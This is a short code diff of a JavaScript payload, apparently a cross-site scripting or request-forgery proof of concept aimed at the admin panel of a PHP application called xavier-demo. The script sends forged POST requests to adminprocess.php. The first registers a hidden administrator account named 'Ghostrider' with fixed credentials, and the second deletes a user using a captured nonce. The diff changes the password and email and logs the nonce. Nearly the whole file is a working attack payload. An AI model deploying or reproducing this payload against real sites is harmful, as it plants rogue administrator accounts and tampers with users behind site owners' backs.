@@ -1,7 +1,7 @@
 var root = "";
 var req = new XMLHttpRequest();
 var url = root + "/xavier-demo/admin/includes/adminprocess.php";
-var params = "user=Ghostrider&firstname=Ghostrider&lastname=Ghostrider&pass=SupermanSuperman&conf_pass=SupermanSuperman&email=Ghostrider%40Superman.com&conf_email=Ghostrider%40Superman.com&form_submission=admin_registration";
+var params = "user=Ghostrider&firstname=Ghostrider&lastname=Ghostrider&pass=GhostRiderGhostRider&conf_pass=GhostRiderGhostRider&email=Ghostrider123%40Superman.com&conf_email=Ghostrider123%40Superman.com&form_submission=admin_registration";
 req.open("POST", url, true);
 req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req.send(params);
@@ -17,4 +17,4 @@ var params2 = "delete-user="+nonce+"&form_submission=delete_user&usertoedit=Ghos
 req2.open("POST", url3, true);
 req2.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 req2.send(params2);
-
+console.log(nonce)
